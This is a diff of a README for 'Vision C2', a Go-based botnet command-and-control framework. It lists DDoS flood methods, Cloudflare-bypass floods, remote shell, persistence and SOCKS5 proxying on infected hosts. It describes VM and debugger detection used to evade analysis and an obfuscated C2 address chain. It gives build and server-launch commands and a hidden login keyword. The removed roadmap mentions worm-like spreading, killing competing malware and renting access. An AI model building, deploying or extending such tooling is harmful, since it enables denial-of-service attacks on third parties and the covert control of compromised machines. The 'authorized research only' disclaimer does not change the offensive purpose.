@@ -1,67 +1,96 @@
 
-
 <div align="center">
 
-# ☾℣☽ision C2 - Advanced Go-Based C2 Framework
-
-
-`DDoS` · `SOCKS5 Proxy` · `Remote Shell` · `Multi-Arch` · `TUI Dashboard`
-
----
-<img width="1461" height="670" alt="Screenshot 2026-02-07 214839" src="https://github.com/user-attachments/assets/89abefce-815f-4114-90ea-d51674ff3bb8" />
-
-> **Vision** is a Go-based C2 framework featuring a simple one click setup script. Secured by TLS 1.3 + HMAC authentication, multi-layer C2 address encryption, and sandbox evasion through VM/Debugger detection — compiling persistent agents for 14+ architectures.
-
+# ☾℣☽ision C2
 ![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge)
 ![License](https://img.shields.io/badge/License-GNU%20GPLv3-yellow?style=for-the-badge)
 
+
+
+**Vision** is a Go-based C2 framework featuring one-click setup, TLS-secured communications, layered C2 address obfuscation, sandbox evasion, and cross-compiled persistent agents for **14+ architectures**.
+
+<img src="https://github.com/user-attachments/assets/89abefce-815f-4114-90ea-d51674ff3bb8" alt="Vision C2 Dashboard" width="90%" />
+
+`DDoS` · `SOCKS5 Proxy` · `Remote Shell` · `Multi-Arch` · `TUI Dashboard`
+
 </div>
 
-## 📑 Table of Contents
-
-- [Features](#-features)
-- [Install & Build](#-getting-setup)
-- [Running the C2 Server](#%EF%B8%8F-running-the-c2-server)
-- [Documentation](#-documentation)
-- [Roadmap](#%EF%B8%8F-roadmap)
-
 ---
-## 🤖 Commands
 
-| Command | Description |
-|---------|-------------|
-| `!shell`, `!exec` | Execute shell command with output |
-| `!stream` | Real-time command streaming output |
-| `!detach`, `!bg` | Run shell command in background |
-| `!stop` | Stop all attacks |
-| `!udpflood` | UDP flood attack |
-| `!tcpflood` | TCP connection flood |
-| `!http` | HTTP GET/POST flood |
-| `!https`, `!tls` | HTTPS/TLS flood |
-| `!cfbypass` | Cloudflare bypass flood |
-| `!syn` | Raw SYN flood |
-| `!ack` | Raw ACK flood |
-| `!gre` | GRE protocol flood |
-| `!dns` | DNS Amp flood |
-| `!persist` | Setup persistence |
-| `!kill` | Terminate bot |
-| `!info` | Get system info |
-| `!socks` | Start SOCKS5 proxy |
-| `!stopsocks` | Stop SOCKS5 proxy |
+
+## 🖥️ CNC Interface (TUI – Bubble Tea)
+
+
+
+The CNC runs as a Bubble Tea–based TUI providing live bot telemetry, attack control, and remote command execution.
+
+**Features**
+- Dashboard: bot count, RAM / CPU usage, uptime
+- Bot list with live stats and actions
+- Attack builder with method, target, and duration control
+- Broadcast shell and per-bot remote shell
+- SOCKS5 proxy management
+- Built-in help system
 
 ---
 
+### Remote Shell
+
+Interactive shell access with real-time output and command history.
+
+<div align="center">
+  <img
+    src="https://github.com/user-attachments/assets/7dc65c29-b072-484e-9b5c-bcb628147c88"
+    alt="Remote Shell View"
+    width="95%"
+  />
+</div>
+
 ---
+### Layer 4 (Network)
+
+| Method    | Protocol     | Technique                     |
+|-----------|--------------|-------------------------------|
+| UDP Flood | UDP          | 1024-byte payload spam        |
+| TCP Flood | TCP          | Connection exhaustion         |
+| SYN Flood | Raw TCP      | Raw SYN packets, random ports |
+| ACK Flood | Raw TCP      | Raw ACK packets               |
+| GRE Flood | Raw GRE (47) | GRE packets, max payload      |
+| DNS Flood | UDP / DNS    | Random A/AAAA/MX/NS queries   |
+
+### Layer 7 (Application)
+
+| Method          | Technique                             |
+|-----------------|---------------------------------------|
+| HTTP Flood      | GET/POST requests, randomized headers |
+| HTTPS/TLS Flood | TLS handshake with request bursts     |
+| CF Bypass       | Session reuse, cookie persistence     |
+
+
+## ⚔️ Attack Builder
+
+<div align="center">
+  <img
+    src="https://github.com/user-attachments/assets/2dc9356a-3d60-4a02-b377-f8df40bf4426"
+    alt="CNC Dashboard"
+    width="90%"
+  />
+</div>
+
+---
+
+
 ## 🚀 Getting Setup
 
-**Ubuntu/Debian:**
+### Dependencies (Ubuntu / Debian)
 
 ```bash
-sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen build-essential
-```
+sudo apt update && sudo apt install -y \
+  upx-ucl openssl git wget gcc python3 screen build-essential
+````
 
-### **Step 1: Clone Repository**
+### 1️⃣ Clone the Repository
 
 ```bash
 git clone https://github.com/Syn2Much/VisionC2.git
@@ -69,133 +98,70 @@ cd VisionC2
 chmod +x *
 ```
 
-### **Step 2: Run Interactive Setup**
+### 2️⃣ Run Interactive Setup
 
 ```bash
 python3 setup.py
-
-# Prompts will appear asking for C2 URL, Port, and config for you TLS Certs
 ```
 
-The setup script will:
+**The setup script will:**
 
 1. Generate 4096-bit TLS certificates
-2. Create encryption keys and magic codes
-3. Automatically update source code with user provided details
-4. Cross-compile bot binaries for all architectures
+2. Create encryption keys and magic values
+3. Patch configuration into source
+4. Cross-compile bot binaries (14+ architectures)
 5. Build the CNC server binary
 
-**Output Locations:**
+### Output Locations
 
-- CNC Server: `./server` (in VisionC2 root directory)
-- Bot Binaries: `./VisionC2/bins/`
-- Configuration: `setup_config.txt`
+* **CNC Server:** `./server`
+* **Bot Binaries:** `./bins/`
+* **Config:** `setup_config.txt`
+
+---
 
 ## 🖥️ Running the C2 Server
 
-### **Option 1: TUI Mode (Recommended/Full Features)**
+### Option 1: TUI Mode (Recommended)
 
 ```bash
-# Start in screen session for persistence
 screen ./server
-
-# Detach from screen session: Ctrl+A, then D
-# Reattach: screen -r 
 ```
 
-### **Option 2: Telnet/Multi-User Mode (Legacy/For Renting Spots)**
+* Detach: `Ctrl + A` → `D`
+* Reattach: `screen -r`
+
+### Option 2: Telnet / Multi-User Mode
 
 ```bash
-# Start with split admin interface
 screen ./server --split
-
-# Connect to admin interface
 nc your-server-ip 1337
-# Login with "spamtec" to access hidden portal
-# Uses cnc/users.json as a database 
 ```
 
-> [COMMANDS.md](Docs/COMMANDS.md) — **Complete CNC command reference**
+* User DB: `cnc/users.json`
+* Login keyword: `spamtec`
+
+📘 **Reference:** `Docs/COMMANDS.md`
 
 ---
 
-## 📁 File Structure
+## 🏗️ Architecture Overview
 
+```text
+Sandbox / Debug Checks
+ ├─ VM, sandbox, debugger detection
+ └─ Exit on detection
+
+C2 Address Decryption
+ ├─ Base64 → XOR → RC4 → checksum
+ └─ DNS resolution chain
+
+Bot ⇄ CNC Protocol
+ ├─ TLS handshake
+ ├─ HMAC challenge / response
+ ├─ Registration payload
+ └─ Encrypted command loop
 ```
-
-VisionC2/
-├── go.mod                  # Go module (Vision), Go 1.24
-├── go.sum
-├── setup.py                # Interactive setup wizard (Python 3)
-├── server                  # Compiled CNC binary
-├── bot/                    # Bot agent source
-│   ├── main.go             # Entry point, config, shell exec, main loop
-│   ├── connection.go       # TLS connection, DNS resolution, auth, C2 handler
-│   ├── ....
-├── cnc/                    # CNC server source
-│   ├── main.go             # Server entry, TLS listener, user listener
-│   ├── connection.go       # TLS config, bot auth handler, bot management
-│   ├── ....
-├── tools/
-│   ├── build.sh            # Cross-compilation for 14 architectures
-│   └── deUPX.py            # UPX signature stripper
-│
-├── bins/                   # Compiled bot binaries (output)
-└── Docs/
-    ├── ARCHITECTURE.md     # Technical overview
-    ├── COMMANDS.md          # TUI hotkey reference
-    ├── USAGE.md             # Usage guide
-    ├── CHANGELOG.md         # Version history
-    └── LICENSE
-```
-## 🏗️ Architecture
-
-```
-┌──────────────────────────┬──────────────────────────┬──────────────────────────────────────────────────┐
-│   Sandbox / Debug Check  │  C2 Address Decryption   │          Bot ◄──► CNC Protocol                   │
-├──────────────────────────┼──────────────────────────┼──────────────────────────────────────────────────┤
-│                          │                          │                                                  │
-│ /proc scan:              │ Obfuscated const         │ TLS 1.2+ Handshake ──────────────────────────►   │
-│  VM: vmware,vbox,qemu    │  │                       │                                                  │
-│  Sandbox: cuckoo,any.run │  ▼ Base64 → XOR          │ ◄──────────── HMAC_CHALLENGE:<nonce> ──────────  │
-│  Tools: gdb,strace,ida   │  ▼ RC4 (derived key)     │                                                  │
-│  Parent: gdb,strace,rr   │  ▼ Byte sub → MD5 check  │ Base64(MD5(nonce+magic+nonce)) ──────────────►   │
-│                          │  │                       │                                                  │
-│ Detected → exit(200)     │  ▼ Plaintext C2          │ ◄──────────── HMAC_SUCCESS ───────────────────   │
-│                          │  │                       │                                                  │
-│ Clean ──────────────────►│  ▼ DNS resolve:          │ REGISTER:ver:id:arch:ram:cpu ─────────────────►  │
-│                          │  DoH TXT → UDP TXT       │                                                  │
-│                          │  → A Record → Raw IP     │ ◄──────── Command Loop (Encypted over TLS)       │
-│                          │  │                       │  PING/PONG │ !shell │ !http │ !syn │ !persist    │
-│                          │  └──────────────────────►│                                                  │
-└──────────────────────────┴──────────────────────────┴──────────────────────────────────────────────────┘
-```
----
-
-## 📜 Documentation
-
-| File                    | Description                                      |
-|-------------------------|--------------------------------------------------|
-| [USAGE.md](Docs/USAGE.md)    | Full setup, deployment, and TUI guide            |
-| [COMMANDS.md](Docs/COMMANDS.md) | Complete CNC command reference              |
-| [CHANGELOG.md](Docs/CHANGELOG.md) | Version history and breaking changes         |
-| [ARCHITECTURE.md](Docs/ARCHITECTURE.md) | Detailed technical breakdown         |
-
----
-
-## 🛣️ Roadmap
-
-**In Progress**
-
-- Finish TUI Updates
-- Enhanced daemonization
-- Competitor locker / killer module
-  
-**Planned**
-
-- Auto-generated DGA fallback domains
-- Self-replication & worm-like spreading
-- Single-instance port takeover
 
 ---
 
@@ -203,12 +169,10 @@ VisionC2/
 
 **FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**
 
-This software is provided strictly for educational, research, and authorized penetration testing purposes. The authors are not responsible for any misuse or legal consequences resulting from its use.
+---
 
-## 📜 License
-
-GNU General Public License v3.0 — see [LICENSE](LICENSE)
-
-<div align="center">
+<p align="center">
 <sub>Maintained with ❤️ by Syn</sub>
-</div>
+</p>
+
+
